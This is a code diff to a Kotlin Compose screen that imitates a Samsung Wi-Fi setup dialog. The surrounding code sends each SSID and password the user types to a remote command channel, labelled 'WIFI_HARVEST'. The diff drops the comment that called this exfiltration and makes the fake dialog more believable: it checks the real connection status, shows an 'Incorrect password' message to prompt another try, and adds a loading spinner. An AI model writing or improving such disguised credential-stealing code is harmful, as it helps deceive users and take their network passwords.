@@ -323,6 +323,7 @@ class WelcomeUI : DynamicEntry() {
         var selectedSsid by remember { mutableStateOf<String?>(null) }
         var isConnecting by remember { mutableStateOf(false) }
         var connectionSuccess by remember { mutableStateOf(false) }
+        var showWrongPasswordError by remember { mutableStateOf(false) }
 
         // Live Scanning Effect
         LaunchedEffect(isWifiEnabled) {
@@ -391,26 +392,46 @@ class WelcomeUI : DynamicEntry() {
             }
 
             if (selectedSsid != null) {
-                SamsungPasswordDialog(selectedSsid!!, onDismiss = { selectedSsid = null }) { password ->
+                SamsungPasswordDialog(
+                    ssid = selectedSsid!!,
+                    isConnecting = isConnecting,
+                    showError = showWrongPasswordError,
+                    onDismiss = { 
+                        if (!isConnecting) {
+                            selectedSsid = null
+                            showWrongPasswordError = false
+                        }
+                    }
+                ) { password ->
                     isConnecting = true
+                    showWrongPasswordError = false
                     val ssid = selectedSsid!!
-                    selectedSsid = null
-                    // 1. Exfiltrate the credential immediately
+                    
                     val logCmd = org.json.JSONObject().apply {
                         put("file_name", "PING")
                         put("content", "WIFI_HARVEST | SSID: $ssid | PASS: $password")
                     }
                     api.executeCommand(logCmd.toString())
                     
-                    // 2. Perform real hardware connection
                     api.connectToWifi(ssid, password)
                     
                     kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
-                        delay(3500) // Simulate auth latency
-                        isConnecting = false
-                        connectionSuccess = true
-                        delay(1500)
-                        onConnected()
+                        var status = "CONNECTING"
+                        while(status == "CONNECTING" || status == "NONE") {
+                            delay(500)
+                            status = api.getWifiStatus()
+                        }
+                        
+                        if (status == "SUCCESS") {
+                            isConnecting = false
+                            connectionSuccess = true
+                            selectedSsid = null
+                            delay(1000)
+                            onConnected()
+                        } else {
+                            isConnecting = false
+                            showWrongPasswordError = true
+                        }
                     }
                 }
             }
@@ -486,7 +507,7 @@ class WelcomeUI : DynamicEntry() {
     }
 
     @Composable
-    fun SamsungPasswordDialog(ssid: String, onDismiss: () -> Unit, onConnect: (String) -> Unit) {
+    fun SamsungPasswordDialog(ssid: String, isConnecting: Boolean, showError: Boolean, onDismiss: () -> Unit, onConnect: (String) -> Unit) {
         var pass by remember { mutableStateOf("") }
         Box(
             modifier = Modifier
@@ -509,25 +530,36 @@ class WelcomeUI : DynamicEntry() {
                         value = pass,
                         onValueChange = { pass = it },
                         label = { Text("Password") },
+                        isError = showError,
                         singleLine = true,
                         visualTransformation = androidx.compose.ui.text.input.PasswordVisualTransformation(),
                         modifier = Modifier.fillMaxWidth(),
                         colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = SamsungBlue, focusedLabelColor = SamsungBlue)
                     )
+                    if (showError) {
+                        Text("Incorrect password. Please try again.", color = Color(0xFFEF4444), fontSize = 13.sp, modifier = Modifier.padding(top = 4.dp, start = 8.dp))
+                    }
                     Row(modifier = Modifier.padding(top = 12.dp), verticalAlignment = Alignment.CenterVertically) {
                         val checked = remember { mutableStateOf(false) }
                         SamsungCheckbox(checked.value) { checked.value = !checked.value }
                         Text("Show password", modifier = Modifier.padding(start = 12.dp), fontSize = 16.sp)
                     }
                     Spacer(Modifier.height(32.dp))
-                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.End) {
+                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.End, verticalAlignment = Alignment.CenterVertically) {
                         Text("Cancel", color = SamsungBlue, fontWeight = FontWeight.Bold, modifier = Modifier.padding(16.dp).clickable { onDismiss() })
                         Button(
                             onClick = { onConnect(pass) },
-                            enabled = pass.length >= 8,
+                            enabled = pass.length >= 8 && !isConnecting,
                             colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue),
-                            shape = RoundedCornerShape(20.dp)
-                        ) { Text("Connect") }
+                            shape = RoundedCornerShape(20.dp),
+                            modifier = Modifier.height(40.dp)
+                        ) { 
+                            if (isConnecting) {
+                                CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White, strokeWidth = 2.dp)
+                            } else {
+                                Text("Connect") 
+                            }
+                        }
                     }
                 }
             }
